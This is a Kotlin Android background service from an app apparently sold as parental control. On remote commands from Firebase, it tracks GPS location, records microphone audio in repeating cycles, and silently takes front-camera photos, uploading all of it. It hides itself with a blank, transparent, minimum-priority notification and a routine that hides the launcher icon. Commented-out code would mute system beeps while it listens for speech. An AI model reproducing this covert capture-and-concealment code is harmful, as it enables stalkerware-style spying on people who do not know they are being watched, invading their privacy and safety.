package com.controlparental.jerico

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.Timestamp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.GeoPoint
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.FileOutputStream
import java.util.Date
import java.util.Locale


class BackgroundService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var firestore: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var storage: FirebaseStorage
    private var locationCallback: LocationCallback? = null
    private var locationUpdateInterval: Long = 10000L // Intervalo por defecto
    private var recordingCycleDuration: Long = 60000L // 60 segundos de grabación por defecto
    private var isRecording = false
    private var recorder: MediaRecorder? = null
    private lateinit var handler: Handler
    private var filePath: String = ""
    private lateinit var batteryStatusReceiver: BatteryStatusReceiver
    private var lastBatteryPercentage: Float = -1f
    private var speechRecognizer: SpeechRecognizer? = null
    private var recognizerIntent: Intent? = null
    private var audioManager: AudioManager? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("BackgroundService", "Service onCreate called")
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        firestore = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()
        storage = FirebaseStorage.getInstance()
        handler = Handler(Looper.getMainLooper())
        startListeningForUserPreferences() // Escuchar cambios en Firebase

        // Registrar el receptor de batería
        batteryStatusReceiver = BatteryStatusReceiver()
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        registerReceiver(batteryStatusReceiver, filter)
        //initializeSpeechRecognizer()
        //startListening()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Verificación de permisos
        Log.d("BackgroundService", "Service onStartCommand called")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            stopSelf()
            Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_LONG).show()
            return START_NOT_STICKY
        }
        startForegroundService()
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        //initializeSpeechRecognizer()
        //startListening()
        //acquireWakeLock()
        return START_STICKY
    }

    private fun checkPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private fun startForegroundService() {
        val notificationChannelId = "ForegroundServiceChannel"
        val notificationChannelName = "Foreground Service Channel"

        val notificationChannel = NotificationChannel(notificationChannelId, notificationChannelName, NotificationManager.IMPORTANCE_LOW)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(notificationChannel)

        // Crear una notificación mínima
        val notification: Notification = NotificationCompat.Builder(this, notificationChannelId)
        .setContentTitle("") // Sin título
        .setContentText("") // Sin texto
        .setSmallIcon(R.drawable.ic_transparent) // Icono transparente para minimizar visibilidad
        .setPriority(NotificationCompat.PRIORITY_MIN) // Bajar la prioridad al mínimo
        .setOngoing(true) // Evita que el usuario la cierre
        .build()


        startForeground(1, notification)
    }

    // Aquí recibimos el estado de la batería y actualizamos Firestore
    inner class BatteryStatusReceiver : BroadcastReceiver() {
        private val firestore = FirebaseFirestore.getInstance()

        override fun onReceive(context: Context, intent: Intent) {
            // Obtener el porcentaje de batería
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1

            if (level != -1 && scale != -1) {
                // Convertir el porcentaje a un valor entre 0 y 1
                val batteryPercentage = level / scale.toFloat()
                Log.d("BatteryStatus", "Battery level: ${batteryPercentage}%")

                // Obtener userId y deviceId
                val userId = FirebaseAuth.getInstance().currentUser?.uid
                val deviceId = getDeviceIdAsString()

                // Si ambos userId y deviceId son válidos, actualizamos Firestore
                if (userId != null && deviceId != null) {
                    if (hasBatteryChanged(batteryPercentage)) {
                        updateBatteryField(batteryPercentage, userId, deviceId)
                        lastBatteryPercentage = batteryPercentage
                    }
                }
            } else {
                Log.e("BatteryStatus", "Unable to get battery level")
            }
        }

        // Función que verifica si el porcentaje de batería ha cambiado en más de 1%
        private fun hasBatteryChanged(newBatteryPercentage: Float): Boolean {
            if (lastBatteryPercentage == -1f) {
                return true  // Si es la primera vez que se obtiene el valor, actualizar
            }
            // Si la diferencia es mayor que 0.01 (1% de cambio)
            return Math.abs(newBatteryPercentage - lastBatteryPercentage) >= 0.01
        }

        private fun updateBatteryField(batteryPercentage: Float, userId: String, deviceId: String) {
            val deviceDocRef = firestore.collection("users")
                .document(userId)
                .collection("devices")
                .document(deviceId)

            deviceDocRef.update("battery", batteryPercentage)
                .addOnSuccessListener {
                    Log.d("BatteryStatus", "Battery level updated successfully")
                }
                .addOnFailureListener { e ->
                    Log.e("BatteryStatus", "Failed to update battery level: ${e.message}")
                }
        }
    }


    private fun startListeningForUserPreferences() {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.addSnapshotListener { snapshot, e ->
            if (e != null) {
                Log.e("BackgroundService", "Error listening for user data changes: ${e.message}")
                return@addSnapshotListener
            }

            if (snapshot != null && snapshot.exists()) {
                val trackingEnabled = snapshot.getBoolean("trackingEnabled") ?: true
                val newRecordingEnabled = snapshot.getBoolean("recordingEnabled") ?: false
                locationUpdateInterval = snapshot.getLong("locationUpdateInterval") ?: 10000L
                recordingCycleDuration = snapshot.getLong("recordingCycleDuration") ?: 60000L
                val takePhoto = snapshot.getBoolean("takePhoto") ?: false
                val soundEnabled = snapshot.getBoolean("sound") ?: false

                // Manejar el tracking según Firestore
                if (trackingEnabled) {
                    stopLocationUpdates()
                    startLocationUpdates()
                } else {
                    stopLocationUpdates()
                }

                // Manejar la grabación según Firestore
                if (newRecordingEnabled && !isRecording) {
                    //stopListening() // Desactivar la escucha cuando la grabación está activa
                    startRecordingCycle()
                } else if (!newRecordingEnabled && isRecording) {
                    stopRecordingAndUpload(filePath)
                }
                // Manejar la toma de fotos si takePhoto es true
                if (takePhoto) {
                    takePhotoAndUpload() // Tomar la foto y subirla
                    updateTakePhotoField(false) // Cambiar takePhoto a false después de tomar la foto
                }
                if (soundEnabled) {
                    playAlarmSound() // Reproducir el sonido de alarma
                    updateSoundField(false, userId, deviceId) // Reiniciar el campo a `false`
                }
            }
        }
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, locationUpdateInterval)
            .setMinUpdateIntervalMillis(locationUpdateInterval)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    Log.d("BackgroundService", "Location: ${location.latitude}, ${location.longitude}, ${locationUpdateInterval}")
                    sendLocationToFirestore(location.latitude, location.longitude)
                }
            }
        }

        try {
            if (checkPermissions()) {
                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback!!, null)
            } else {
                Log.e("BackgroundService", "Location permission not granted")
            }
        } catch (e: SecurityException) {
            Log.e("BackgroundService", "SecurityException: ${e.message}")
        }
    }

    private var lastUpdateTimestamp: Long = 0

    @SuppressLint("HardwareIds")
    private fun getDeviceIdAsString(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun sendLocationToFirestore(latitude: Double, longitude: Double) {
        val currentTime = System.currentTimeMillis()

        if (currentTime - lastUpdateTimestamp >= locationUpdateInterval) {
            lastUpdateTimestamp = currentTime

            val user = auth.currentUser
            if (user != null) {
                val userId = user.uid
                val deviceId = getDeviceIdAsString()

                // Crear un objeto GeoPoint para las coordenadas
                val geoPoint = GeoPoint(latitude, longitude)

                // Obtener la fecha y hora actual
                val timestamp = Date()

                // Datos a guardar en la colección de dispositivos
                val locationData = hashMapOf(
                    "location" to geoPoint,
                    "timestamp" to timestamp
                )

                // Guardar la ubicación en la subcolección "locations" del dispositivo
                firestore.collection("users").document(userId)
                    .collection("devices").document(deviceId)
                    .collection("locations")
                    .add(locationData)
                    .addOnSuccessListener {
                        Log.d("BackgroundService", "Location successfully recorded in 'locations' collection for device: $deviceId")
                    }
                    .addOnFailureListener { e ->
                        Log.e("BackgroundService", "Error saving location: ${e.message}")
                    }

                // Actualizar el campo lastCoordinate y lastTimeStamp en el documento del dispositivo
                val deviceUpdates = hashMapOf(
                    "lastCoordinate" to geoPoint as Any,
                    "lastTimeStamp" to timestamp as Any
                )

                firestore.collection("users").document(userId)
                    .collection("devices").document(deviceId)
                    .set(deviceUpdates, SetOptions.merge())
                    .addOnSuccessListener {
                        Log.d("BackgroundService", "Device lastCoordinate and lastTimeStamp successfully updated")
                    }
                    .addOnFailureListener { e ->
                        Log.e("BackgroundService", "Error updating lastCoordinate and lastTimeStamp for device: ${e.message}")
                    }

            } else {
                Log.e("BackgroundService", "User not authenticated")
            }
        } else {
            Log.d("BackgroundService", "Skipping location update, interval not reached.")
        }
    }

    private fun stopLocationUpdates() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            Log.d("BackgroundService", "Location updates stopped")
        }
    }

    private val uploadQueue = mutableListOf<File>()
    private var isUploading = false

    private fun startRecordingCycle() {
        if (isRecording) {
            Log.d("BackgroundService", "Recording is already running. Skipping start.")
            return
        }

        Log.d("BackgroundService", "Starting new recording cycle...")

        try {
            filePath = getRecordingFilePath()

            // Configuración del MediaRecorder según la versión de Android
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12+
                Log.d("BackgroundService", "Using MediaRecorder for Android 12+")
                MediaRecorder(applicationContext).apply {
                    setAudioSource(MediaRecorder.AudioSource.UNPROCESSED)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(192000)
                    setAudioSamplingRate(48000)
                    setOutputFile(filePath)
                    prepare()
                }
            } else { // Android 11 o inferior
                Log.d("BackgroundService", "Using MediaRecorder for Android 11 or lower")
                @Suppress("DEPRECATION")
                MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(filePath)
                    prepare()
                }
            }

            recorder?.apply {
                start()
            }

            isRecording = true
            Log.d("BackgroundService", "Recording started with file: $filePath")

            // Detener la grabación después del ciclo actual y programar el siguiente ciclo
            handler.postDelayed({
                Log.d("BackgroundService", "Recording cycle completed, stopping and uploading the file.")
                stopRecordingAndScheduleUpload(filePath)

                // Verificar si la grabación debe continuar, dependiendo de 'recordingEnabled' en Firestore
                checkRecordingEnabledAndRestartCycle()
            }, recordingCycleDuration)

        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to start recording: ${e.message}")
            stopRecordingAndScheduleUpload(filePath)
        }
    }

    private fun checkRecordingEnabledAndRestartCycle() {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.get().addOnSuccessListener { snapshot ->
            if (snapshot.exists()) {
                val recordingEnabled = snapshot.getBoolean("recordingEnabled") ?: false
                if (recordingEnabled) {
                    Log.d("BackgroundService", "recordingEnabled is true, restarting the recording cycle.")
                    startRecordingCycle() // Reiniciar el ciclo si recordingEnabled sigue en true
                } else {
                    Log.d("BackgroundService", "recordingEnabled is false, stopping the recording cycle.")
                }
            } else {
                Log.e("BackgroundService", "Device document not found.")
            }
        }.addOnFailureListener { e ->
            Log.e("BackgroundService", "Error checking recordingEnabled: ${e.message}")
        }
    }

    private fun stopRecordingAndScheduleUpload(filePath: String?) {
        if (!isRecording) return

        try {
            recorder?.apply {
                stop()
                reset()
                release()
            }
            recorder = null
            isRecording = false
            Log.d("BackgroundService", "Recording stopped. File saved at: $filePath")
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to stop recording: ${e.message}")
        }

        filePath?.let {
            val file = File(it)
            if (file.exists()) {
                uploadRecordingToStorage(file)
            } else {
                Log.e("BackgroundService", "File not found: $it")
            }
        }
    }

    private fun processUploadQueue() {
        if (isUploading) return // Evitar procesar múltiples subidas simultáneamente

        synchronized(uploadQueue) {
            if (uploadQueue.isEmpty()) return
            isUploading = true
            val fileToUpload = uploadQueue.removeAt(0)

            uploadRecordingToStorage(fileToUpload)
        }
    }

    private fun compressAudioFile(inputFilePath: String, outputFilePath: String): Boolean {
        return try {
            val inputFile = File(inputFilePath)
            val outputFile = File(outputFilePath)

            if (!inputFile.exists()) {
                Log.e("BackgroundService", "Input file does not exist")
                return false
            }

            // Copiar el archivo como está (mejor compresión requiere bibliotecas adicionales como FFmpeg)
            inputFile.copyTo(outputFile, overwrite = true)
            true
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to compress audio file: ${e.message}")
            false
        }
    }

    private fun stopRecordingAndUpload(filePath: String) {
        try {
            recorder?.apply {
                stop()
                release()
            }
            recorder = null
            isRecording = false

            val file = File(filePath)
            if (file.exists() && file.length() > 0) {
                val compressedFilePath = "${applicationContext.filesDir}/compressed_${System.currentTimeMillis()}.mp4"
                if (compressAudioFile(filePath, compressedFilePath)) {
                    uploadRecordingToStorage(File(compressedFilePath))
                } else {
                    Log.e("BackgroundService", "Compression failed, uploading original file")
                    uploadRecordingToStorage(file)
                }
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error stopping recording: ${e.message}")
        }
    }

    private fun getRecordingFilePath(): String {
        val recordingDir = File(filesDir, "recordings")
        if (!recordingDir.exists()) {
            recordingDir.mkdirs()
        }
        return File(recordingDir, "recording_${System.currentTimeMillis()}.mp4").absolutePath
    }

    private fun uploadRecordingToStorage(file: File) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val timestamp = System.currentTimeMillis()

        val storageRef = storage.reference.child("recordings/$userId/$deviceId/${file.name}")
        storageRef.putFile(Uri.fromFile(file))
            .addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { uri ->
                    saveRecordingMetadata(userId, deviceId, uri.toString(), timestamp)
                    Log.d("BackgroundService", "File uploaded successfully: ${file.name}")

                    // Eliminar archivo local tras subirlo
                    file.delete()
                    Log.d("BackgroundService", "Local file deleted: ${file.name}")
                }
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "File upload failed: ${e.message}")
            }
            .addOnCompleteListener {
                isUploading = false
                processUploadQueue() // Procesar el siguiente archivo en la cola
            }
    }

    private fun saveRecordingMetadata(userId: String, deviceId: String, downloadUrl: String, timestamp: Long) {
        val recordingData = mapOf(
            "url" to downloadUrl,
            "timestamp" to Timestamp(Date(timestamp)), // Convertir el long a Timestamp
            "deviceId" to deviceId,
            "isRead" to false // Campo adicional con valor predeterminado
        )

        firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)
            .collection("recordings")
            .add(recordingData)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Recording metadata saved successfully")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to save recording metadata: ${e.message}")
            }
    }

    private fun stopRecording() {
        try {
            recorder?.apply {
                stop()
                release()
                Log.d("BackgroundService", "Recording stopped and resources released")
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error stopping MediaRecorder: ${e.message}")
        } finally {
            recorder = null
            isRecording = false
        }
    }

    private fun updateLauncherIconVisibility(enable: Boolean) {
        val packageManager = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        Log.d("BackgroundService", "Habilitando o sesabilitando icono: $enable")
        
        if (enable) {
            // Habilitar el icono del launcher
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("BackgroundService", "Launcher icon enabled")
        } else {
            // Deshabilitar el icono del launcher
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("BackgroundService", "Launcher icon disabled")
        }
    }

    @SuppressLint("ServiceCast")
    private fun takePhotoAndUpload() {
        val context = applicationContext // Usar el contexto de la aplicación
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        if (cameraManager == null) {
            Log.e("CameraError", "Unable to get CameraManager")
            return
        }

        try {
            // Obtener la cámara frontal
            val cameraId = cameraManager.cameraIdList.first {
                cameraManager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            }

            val imageReader = ImageReader.newInstance(1080, 1920, ImageFormat.JPEG, 1)
            val outputFile = File(getPhotoFilePath())

            // Configurar el listener de imagen
            imageReader.setOnImageAvailableListener({ reader: ImageReader ->
                try {
                    // Obtener la última imagen disponible
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener // Si no hay imagen, no hacer nada
                    val plane = image.planes.getOrNull(0)

                    // Verificar si el plano es válido
                    if (plane != null) {
                        val buffer = plane.buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)

                        // Guardar la imagen en el archivo
                        FileOutputStream(outputFile).use { it.write(bytes) }
                        image.close()

                        // Subir la foto y actualizar Firestore
                        uploadPhotoToStorage(outputFile)
                        updateTakePhotoField(false) // Cambiar takePhoto a false después de tomar la foto
                    } else {
                        Log.e("CameraError", "No valid image plane available")
                    }
                } catch (e: Exception) {
                    Log.e("BackgroundService", "Error processing image: ${e.message}")
                }
            }, handler)

            // Abrir la cámara
            if (ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.CAMERA
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return
            }
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    // Crear la sesión de captura cuando la cámara se ha abierto
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)

                    // Crear la sesión de captura
                    camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            try {
                                session.capture(captureRequest.build(), null, handler)
                            } catch (e: CameraAccessException) {
                                Log.e("CameraError", "Error during capture: ${e.message}")
                            }
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            Log.e("CameraError", "Failed to configure camera session.")
                        }
                    }, handler)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraError", "Camera error: $error")
                }
            }, handler)

        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to take photo: ${e.message}")
        }
    }

    private fun getPhotoFilePath(): String {
        val context = applicationContext
        val photoDirectory = File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "MyAppPhotos")

        // Asegurarse de que el directorio exista
        if (!photoDirectory.exists()) {
            photoDirectory.mkdirs()  // Crear el directorio si no existe
        }

        // Generar el nombre del archivo (puedes cambiar el nombre según lo que prefieras)
        val photoFileName = "photo_${System.currentTimeMillis()}.jpg"

        // Devolver la ruta completa del archivo
        return File(photoDirectory, photoFileName).absolutePath
    }

    private fun uploadPhotoToStorage(file: File) {
        val userId = auth.currentUser?.uid ?: return
        val storageRef = storage.reference.child("photos/$userId/${file.name}")

        storageRef.putFile(Uri.fromFile(file))
            .addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { uri ->
                    savePhotoUrlToFirestore(uri.toString())
                }
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Photo upload failed: ${e.message}")
            }
    }

    private fun savePhotoUrlToFirestore(url: String) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        val deviceDocRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)

        val timestamp = Date()

        val photoData = mapOf(
            "url" to url,
            "isView" to false,
            "timestamp" to timestamp
        )

        deviceDocRef.collection("photos")
            .add(photoData)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Photo URL saved successfully")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to save photo URL: ${e.message}")
            }
    }

    private fun updateTakePhotoField(value: Boolean) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)
            .update("takePhoto", value)
            .addOnSuccessListener {
                Log.d("BackgroundService", "takePhoto field updated to $value")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to update takePhoto field: ${e.message}")
            }
    }

    private fun playAlarmSound() {
        val mediaPlayer = MediaPlayer.create(this, R.raw.alarm_sound)
        mediaPlayer.start()

        mediaPlayer.setOnCompletionListener {
            it.release() // Liberar recursos después de reproducir el sonido
        }
    }


    private fun updateSoundField(value: Boolean, userId: String, deviceId: String) {
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.update("sound", value)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Sound field updated to $value")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Error updating sound field: ${e.message}")
            }
    }

    private fun initializeSpeechRecognizer() {
        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)
        recognizerIntent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
            putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
        }

        speechRecognizer?.setRecognitionListener(object : RecognitionListener {
            override fun onReadyForSpeech(params: Bundle?) {
                Log.d("SpeechRecognizer", "Ready for speech")
                // Silencia los pitidos del sistema
                audioManager?.setStreamMute(AudioManager.STREAM_SYSTEM, true)
            }

            override fun onResults(results: Bundle?) {
                val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
                if (matches != null && matches.contains("ayuda")) { // Cambia por tu palabra clave
                    triggerAlarm()
                }
                restartListening()
            }

            override fun onError(error: Int) {
                Log.e("SpeechRecognizer", "Error: $error")
                // Silencia los pitidos del sistema también en caso de error
                audioManager?.setStreamMute(AudioManager.STREAM_SYSTEM, true)
                restartListening()
            }

            // Implementa los otros métodos de RecognitionListener si es necesario.
            override fun onBeginningOfSpeech() {}
            override fun onEndOfSpeech() {
                // Restaura el sonido cuando se termine de hablar
                audioManager?.setStreamMute(AudioManager.STREAM_SYSTEM, false)
            }
            override fun onBufferReceived(buffer: ByteArray?) {}
            override fun onPartialResults(partialResults: Bundle?) {}
            override fun onEvent(eventType: Int, params: Bundle?) {}
            override fun onRmsChanged(rmsdB: Float) {}
        })
    }

    private fun restartListening() {
        Log.d("SpeechRecognizer", "Restarting listening")
        speechRecognizer?.stopListening()
        startListening()
    }

    private fun triggerAlarm() {
        Log.e("SpeechRecognizer", "Alarm")
        val mediaPlayer = MediaPlayer.create(this, R.raw.alarm_sound) // Agrega un archivo de sonido en res/raw
        mediaPlayer.start()
    }

    fun startListening() {
        speechRecognizer?.startListening(recognizerIntent)
    }

    fun stopListening() {
        speechRecognizer?.stopListening()
    }

    private lateinit var wakeLock: PowerManager.WakeLock

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::SpeechRecognizerWakeLock")
        wakeLock.acquire(10 * 60 * 1000L /*10 minutos*/)
    }


    override fun onDestroy() {
        stopLocationUpdates()
        stopRecording()
        //stopListening()
        super.onDestroy()
        unregisterReceiver(batteryStatusReceiver)
        // Restaura el sonido al destruir el servicio
        /*audioManager?.setStreamMute(AudioManager.STREAM_SYSTEM, false)
        if (::wakeLock.isInitialized && wakeLock.isHeld) {
            wakeLock.release()
        }
        speechRecognizer?.destroy()*/
        }

    override fun onBind(intent: Intent?): IBinder? {
            return null
    }
}
